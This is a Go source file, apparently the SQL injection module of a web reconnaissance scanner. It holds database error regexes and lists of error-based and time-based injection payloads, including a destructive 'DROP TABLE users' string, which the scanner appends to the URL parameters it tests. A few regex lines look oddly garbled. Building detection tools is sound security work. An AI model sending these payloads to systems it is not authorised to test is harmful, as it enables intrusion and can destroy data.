package sqli

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// SQL error patterns for error-based detection
var sqlErrorPatterns = []string{
	// MySQL
	`SQL syntax.*MySQL`,
	`Warning.*mysql_`,
	`MySQLSyntaxErrorException`,
	`valid MySQL result`,
	`check the manual that corresponds to your MySQL server version`,
	`MySqlClient\.`,
	`com\.mysql\.jdbc`,
	`Unclosed quotation mark after the character string`,

	// PostgreSQL
	`PostgreSQL.*ERROR`,
	`Warning.*\Wpg_`,
	`valid PostgreSQL result`,
	`Npgsql\.`,
	`PG::SyntaxError:`,
	`org\.postgresql\.util\.PSQLException`,
	`ERROR:\s+syntax error at or near`,

	// Microsoft SQL Server
	`Driver.*SQL[\-\_\ ]*Server`,
	`OLE DB.*SQL Server`,
	`\bSQL Server[^&lt;&quot;]+Driver`,
	`Warning.*mssql_`,
	`\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}`,
	`System\.Data\.SqlClient\.SqlException`,
	`(?s)Exception.*\WSystem\.Data\.SqlClient\.`,
	`(?s)Exception.*\WRoadhouse\.Cms\.`,
	`Microsoft SQL Native Client error '[0-9a-fA-F]{8}`,
	`\[SQL Server\]`,
	`ODBC SQL Server Driver`,
	`ODBC Driver \d+ for SQL Server`,
	`SQLServer JDBC Driver`,
	`com\.jnetdirect\.jsql`,
	`macaborr\b`,
	`Zend_Db_(Adapter|Statement)_Sqlsrv_Exception`,
	`com\.microsoft\.sqlserver\.jdbc`,
	`Pdo[.teleported]+Query.*failed`,
	`SQL Server.*Driver.*\[`,
	`mssql_query\(\)`,
	`odbc_exec\(\)`,
	`Microsoft OLE DB Provider for ODBC Drivers`,
	`Microsoft OLE DB Provider for SQL Server`,

	// Oracle
	`\bORA-[0-9][0-9][0-9][0-9]`,
	`Oracle error`,
	`Oracle.*Driver`,
	`Warning.*\Woci_`,
	`Warning.*\Wora_`,
	`oracle\.jdbc`,
	`quoted string not properly terminated`,
	`SQL command not properly ended`,

	// SQLite
	`SQLite/JDBCDriver`,
	`SQLite\.Exception`,
	`(Microsoft|System)\.Data\.SQLite\.SQLiteException`,
	`Warning.*sqlite_`,
	`Warning.*SQLite3::`,
	`\[SQLITE_ERROR\]`,
	`SQLite error \d+:`,
	`sqlite3.OperationalError:`,
	`SQLite3::SQLException`,
	`org\.sqlite\.JDBC`,
	`Pdo[.teleported]+Query.*failed`,

	// General
	`SQL syntax`,
	`syntax error`,
	`unexpected end of SQL command`,
	`Incorrect syntax near`,
	`Syntax error in string in query expression`,
	`Data type mismatch`,
	`SQLSTATE\[`,
}

// Time-based payloads
var timePayloads = []struct {
	payload string
	dbType  string
}{
	{"' OR SLEEP(5)--", "MySQL"},
	{"' OR SLEEP(5)#", "MySQL"},
	{"'; WAITFOR DELAY '0:0:5'--", "MSSQL"},
	{"' OR pg_sleep(5)--", "PostgreSQL"},
	{"' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", "PostgreSQL"},
	{"1' AND SLEEP(5)--", "MySQL"},
	{"1; SELECT SLEEP(5);--", "MySQL"},
}

// Error-based payloads
var errorPayloads = []string{
	"'",
	"\"",
	"' OR '1'='1",
	"' OR '1'='1' --",
	"' OR '1'='1' #",
	"' OR '1'='1'/*",
	"1' ORDER BY 1--+",
	"1' ORDER BY 100--+",
	"' UNION SELECT NULL--",
	"' UNION SELECT NULL,NULL--",
	"') OR ('1'='1",
	"1' AND '1'='1",
	"1\" AND \"1\"=\"1",
	"-1 OR 1=1",
	"-1' OR 1=1--",
	"1;SELECT * FROM users",
	"1'; DROP TABLE users--",
	"admin'--",
	"admin' #",
	"' OR 1=1#",
	"' OR 1=1--",
	"or 1=1--",
	"' OR ''='",
	"' OR 1 --",
	"-1' OR 1=1 OR ''='",
}

// Scan performs SQL injection scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	client := utils.HTTPClient(cfg.Timeout, cfg.Proxy, true)
	sem := make(chan struct{}, cfg.Threads)

	for _, urlStr := range urls {
		// Only test URLs with parameters
		if !utils.HasParam(urlStr) {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testSQLi(u, client, cfg)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testSQLi(urlStr string, client *http.Client, cfg *config.Config) []types.VulnResult {
	var results []types.VulnResult

	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return nil
	}

	params := parsedURL.Query()

	for param := range params {
		// Test error-based SQLi
		if result := testErrorBased(urlStr, param, client); result != nil {
			results = append(results, *result)
			continue // Found vuln, skip other tests for this param
		}

		// Test time-based SQLi (slower, so only if error-based didn't find anything)
		if result := testTimeBased(urlStr, param, client, cfg.Timeout); result != nil {
			results = append(results, *result)
		}
	}

	return results
}

func testErrorBased(urlStr, param string, client *http.Client) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()
	originalValue := originalParams.Get(param)

	for _, payload := range errorPayloads {
		testParams := url.Values{}
		for k, v := range originalParams {
			testParams[k] = v
		}
		testParams.Set(param, originalValue+payload)

		parsedURL.RawQuery = testParams.Encode()
		testURL := parsedURL.String()

		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		// Check for SQL error patterns
		for _, pattern := range sqlErrorPatterns {
			if matched, _ := regexp.MatchString(pattern, bodyStr); matched {
				return &types.VulnResult{
					Type:        "SQL Injection",
					Severity:    "critical",
					URL:         urlStr,
					Parameter:   param,
					Payload:     payload,
					Evidence:    truncateEvidence(bodyStr, pattern),
					Description: "SQL injection vulnerability detected via error-based technique",
					Remediation: "Use parameterized queries or prepared statements. Validate and sanitize all user input.",
					References: []string{
						"https://owasp.org/www-community/attacks/SQL_Injection",
						"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
					},
				}
			}
		}
	}

	return nil
}

func testTimeBased(urlStr, param string, client *http.Client, timeout int) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()
	originalValue := originalParams.Get(param)

	// First, get baseline response time
	baselineStart := time.Now()
	_, err := client.Get(urlStr)
	if err != nil {
		return nil
	}
	baselineTime := time.Since(baselineStart)

	for _, test := range timePayloads {
		testParams := url.Values{}
		for k, v := range originalParams {
			testParams[k] = v
		}
		testParams.Set(param, originalValue+test.payload)

		parsedURL.RawQuery = testParams.Encode()
		testURL := parsedURL.String()

		start := time.Now()
		_, err := client.Get(testURL)
		responseTime := time.Since(start)

		if err != nil {
			// Timeout could indicate successful delay
			if responseTime > time.Duration(timeout)*time.Second*4/5 {
				return &types.VulnResult{
					Type:        "SQL Injection (Time-Based)",
					Severity:    "critical",
					URL:         urlStr,
					Parameter:   param,
					Payload:     test.payload,
					Evidence:    fmt.Sprintf("Response time: %v (baseline: %v)", responseTime, baselineTime),
					Description: fmt.Sprintf("Time-based SQL injection detected. Database type: %s", test.dbType),
					Remediation: "Use parameterized queries or prepared statements. Validate and sanitize all user input.",
					References: []string{
						"https://owasp.org/www-community/attacks/SQL_Injection",
						"https://portswigger.net/web-security/sql-injection/blind",
					},
				}
			}
			continue
		}

		// Check if response time is significantly longer than baseline
		if responseTime > baselineTime+4*time.Second {
			return &types.VulnResult{
				Type:        "SQL Injection (Time-Based)",
				Severity:    "critical",
				URL:         urlStr,
				Parameter:   param,
				Payload:     test.payload,
				Evidence:    fmt.Sprintf("Response time: %v (baseline: %v)", responseTime, baselineTime),
				Description: fmt.Sprintf("Time-based SQL injection detected. Database type: %s", test.dbType),
				Remediation: "Use parameterized queries or prepared statements. Validate and sanitize all user input.",
				References: []string{
					"https://owasp.org/www-community/attacks/SQL_Injection",
				},
			}
		}
	}

	return nil
}

func truncateEvidence(body, pattern string) string {
	re := regexp.MustCompile(pattern)
	match := re.FindString(body)
	if match == "" {
		return ""
	}

	// Find context around the match
	idx := strings.Index(body, match)
	start := idx - 50
	if start < 0 {
		start = 0
	}
	end := idx + len(match) + 50
	if end > len(body) {
		end = len(body)
	}

	return "..." + body[start:end] + "..."
}
